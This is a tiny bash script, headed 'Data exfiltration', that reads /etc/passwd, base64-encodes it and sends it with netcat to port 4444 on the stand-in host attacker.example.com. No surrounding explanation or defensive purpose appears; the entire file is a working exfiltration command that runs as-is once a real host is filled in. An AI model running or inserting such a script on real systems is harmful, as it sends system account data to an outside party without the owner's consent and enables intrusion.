#!/bin/bash
# Data exfiltration
HOST="attacker.example.com"
PORT=4444

# Send data
cat /etc/passwd | base64 | nc $HOST $PORT
